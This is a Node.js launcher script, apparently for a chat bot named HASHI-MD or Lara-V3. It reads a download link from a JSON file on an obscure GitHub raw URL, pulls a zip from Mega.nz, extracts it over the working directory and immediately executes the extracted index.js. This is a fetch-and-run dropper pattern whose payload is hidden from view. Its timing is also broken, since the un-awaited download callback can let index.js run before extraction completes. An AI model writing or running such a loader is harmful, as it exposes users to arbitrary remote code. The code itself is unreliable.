const fs = require('fs');
const path = require('path');
const { File } = require('megajs');  // Mega.nz file handler
const AdmZip = require('adm-zip');
const axios = require('axios');

async function downloadAndExtractMegaZip(megaUrl) {
    try {
        console.log('Downloading Files...📥');

        // Download file from Mega
        const megaFile = File.fromURL(megaUrl);
        const currentDir = process.cwd();
        const zipPath = path.join(currentDir, 'Lara-V3.zip');

        megaFile.download((err, data) => {
            if (err) return console.error('Download failed:', err);

            // Write file to disk
            fs.writeFileSync(zipPath, data);

            // Extract ZIP contents
            const zip = new AdmZip(zipPath);
            zip.extractAllTo(currentDir, true);

            // Delete ZIP after extraction
            fs.unlinkSync(zipPath);

            console.log('Downloading and extracting files...');
        });

    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

async function main() {
    try {
        console.log('Fetching HASHI-MD data...📚');

        // Fetch Mega.nz ZIP link from a remote file
        const response = await axios.get('https://raw.githubusercontent.com/ahdamayasidkhndfamayailoveyou/ffffv/refs/heads/main/aha.js');
        const { zipmegalink } = response.data;

        console.log('Downloading and extracting files...');
        await downloadAndExtractMegaZip(zipmegalink);

        console.log('Executing...');
        require('./index.js'); // Execute the extracted script

    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

main();
